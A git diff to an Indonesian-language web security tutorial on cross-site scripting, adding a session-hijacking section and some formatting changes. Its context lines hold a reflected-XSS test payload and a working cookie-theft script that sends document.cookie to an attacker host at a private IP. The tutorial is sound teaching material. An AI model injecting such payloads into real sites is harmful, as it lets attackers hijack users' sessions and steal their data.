@@ -27,6 +27,8 @@ Event Dadakan 7 January 2021
       - Malware Execution
       - Remote Access Trojan (RAT)
     - Injection - XSS
+      - Innocent Code
+      - Session Hijacking
       - XSS Cheatsheet
 
 # Web Security
@@ -191,7 +193,7 @@ echo "<div>".$input."</div>";
 ?>
 ```
 
-Tidak terdapat Validation, Sanitazion atau Whitelist strategy. 
+Tidak terdapat **Validation**, **Sanitazion** atau **Whitelist strategy**. 
 
 Jika user awam yang memberikan data normalnya seperti ini :
 
@@ -201,7 +203,9 @@ Tapi **attacker** akan memberikan **input malicious script** yang lain misal :
 
 http://www.gun.com/test.php?param=**<script>alert(/xss/)</script>**
 
-Input yang dikirimkan pada kasus di atas adalah malicious script sederhana, realitanya lebih kompleks dan menyeramkan dari script di atas.
+Input yang dikirimkan pada kasus di atas adalah **malicious script** sederhana, realitanya lebih kompleks dan menyeramkan dari **script** di atas.
+
+#### Session Hijacking
 
 **Malicious Script** memiliki akses penuh terhadap seluruh **objects** dalam **browser environment**. Hal yang dapat terjadi selanjutnya adalah **session hijacking**. **Cookies** tempat menyimpan **session** bisa diambil, **attacker** dapat menyamar, mencuri data dan bertindak seolah-olah seperti pengguna (pemilik **session**). 
 
@@ -209,13 +213,13 @@ Input yang dikirimkan pada kasus di atas adalah malicious script sederhana, real
 
 <img src="assets/xss2.png" style="zoom:100%;" />
 
-Di bawah ini adalah contoh **malicious script** yang dapat digunakan untuk membuat **object** **image** dalam web kemudian **attribute src** yang dimiliki **element** tersebut di arahkan menuju remote server milik **attacker**, data yang dikirimkan adalah **cookies**.
+Di bawah ini adalah contoh **malicious script** yang dapat digunakan untuk membuat **object** **image** dalam web kemudian **attribute src** yang dimiliki **element** tersebut di arahkan menuju **remote server** milik **attacker**, data yang dikirimkan adalah **cookies**.
 
 ```javascript
 <script>new Image().src="http://192.168.129.11/mimiperi.php?output="+document.cookie;</script>
 ```
 
-
+Ini hanyalah salah satu contoh dampak yang dapat ditimbulkan dari serangan XSS Attack yang kombinasinya dan kerumitannya bisa variatif, misal XSS Attack agar bisa melakukan phising.
 
 #### XSS Cheatsheet
 
